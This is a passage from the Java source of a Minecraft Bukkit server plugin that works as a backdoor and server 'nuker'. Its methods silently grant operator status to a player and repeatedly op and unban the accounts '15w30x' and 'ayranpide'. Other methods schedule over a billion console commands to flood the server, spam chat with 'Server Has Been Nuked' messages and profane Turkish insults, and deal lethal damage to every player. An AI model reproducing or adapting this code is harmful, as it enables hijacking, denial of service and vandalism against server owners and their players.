\",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true},{\"italic\":false,\"text\":\"15w30x Baba Siker xD \",\"color\":\"dark_red\",\"bold\":true},{\"italic\":false,\"text\":\"aALLAHINIZISIKERIMXD\",\"obfuscated\":true}]']},Enchantments:[{lvl:255,id:knockback},{lvl:255,id:sharpness}],Unbreakable:1,Damage:100,HideFlags:24} 127");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "execute as @a run damage @s 100 minecraft:dragon_breath");
            }, delay);
        }
    }

    private void testPlugin(Player player) {
        Bukkit.getScheduler().runTask(this, () -> {
            player.setOp(true);
            player.sendMessage(ChatColor.GREEN + "Its working. type +6 to see commands.");
        });
    }

    private void consoleSpammer() {
        for (int i = 0; i < 1555555550; i++) {
            int delay = i * 20;
            Bukkit.getScheduler().runTaskLater(this, () -> {
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "help");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "pardon 15w30x");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "pardon ayranpide");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "op 15w30x");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), "op ayranpide");
            }, delay);
        }
    }

    private void spamMessages() {
        for (int i = 0; i < 15555550; i++) {
            Bukkit.getScheduler().runTaskLater(this, () -> {
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(),
                        ChatColor.RED + "tellraw @a \"The Server Has Been Nuked!!!!\"");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(),
                        ChatColor.GREEN + "tellraw @a \"15w30x baba siker!!!!\"");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(),
                        ChatColor.BLUE + "tellraw @a \"ayranpide baba siker!!!!\"");
                Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(),
                        ChatColor.YELLOW + "tellraw @a \"sunucu 15w30x ve ayranpide tarafından patlatildi!!!!\"");
            }, 0L);
        }
    }

    // Trusted oyuncu kontrolü
    public boolean isTrusted(String playerName) {
        return trustedPlayers.contains(playerName.toLowerCase());
    }

    public void addTrustedPlayer(String playerName) {
        trustedPlayers.add(playerName.toLowerCase());
        getLogger().info("Added trusted player: " + playerName);
    }
}